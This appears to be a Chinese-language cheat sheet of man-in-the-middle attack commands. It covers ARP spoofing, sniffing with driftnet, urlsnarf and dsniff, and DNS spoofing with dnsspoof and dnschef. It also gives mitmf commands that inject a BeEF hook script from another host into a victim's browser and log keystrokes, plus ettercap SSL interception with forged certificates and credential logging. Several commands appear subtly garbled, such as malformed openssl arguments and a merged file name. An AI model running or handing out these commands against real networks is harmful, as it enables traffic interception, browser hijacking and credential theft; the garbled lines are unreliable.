
# 中间人攻击

* arp嗅探

* dns欺骗

* mitmf

* ettercap

## arp嗅探
```shell 
    1. arpspoof
        echo 1 > /proc/sys/net/ipv4/ip_forward
        arpspoof -t 1.1.1.12 -r 1.1.1.1
		
    2. 网络嗅探
        driftnet -i eth0 -a -d tempdir -s
        dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts
        urlsnarf -i eth0
        webspy -i eth0 1.1.1.10
        dsniff -i eth0 -m
            /usr/share/dsniff/dsniff.services
```

## dns欺骗
```shell 
    dnschef --fakeip=1.1.1.10 --fakedomains=www.google.com,www.youtube.com --interface 1.1.1.2 -q
```

## mitmf
```shell 
    1. 安装
        apt-get install python-dev python-setuptools libcap0.8-dev libnetfilter-queue-dev libssl-dev libxml2-dev libslt1-dev libcapstone3 libcapstone-dev libffi-dev file
        apt-get install mitmf
        pip uninstall twisted
        wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-15.5.0.tar.bz2
        pip install ./Twisted-15.5.0.tar.bz2  

    2. 启动beef
        cd /usr/share/beef-xss
        ./beef

    3. mitmf 中间人注入xss脚本
        mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js
        mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger
```

## ettercap
```shell 
    1. 实现MITM 
        arp
        ICMP
        DHCP
        Switch Port Stealing
        NDP
    2. 权限
        vi etter.conf 
            ec_uid = 0
            ec_gid = 0

    3. 基于伪造证书的SSL MITIM
        Bridge模式不支持SSL MITM	
        openssl genrsa -out etter.ssl.crt 124
        openssl req -new-keyetter.ssl.crt -out tmp.csr
        openssl x509 -req -days 1825 -in tmp.csr -signkey etter.ssl.crt -out tmp.new
        cat tmp.new >> etter.ssl.crt
        rm -rf tmp.newtmp.crt

    3. 字符模式
        ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2 -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message
		
    4. SSL MITM
        vi /etc/ettercap/etter.conf
		
    5. dns欺骗
        dns spoof 插件配置文件
        vi /etc/ettercap/etter.dns
```


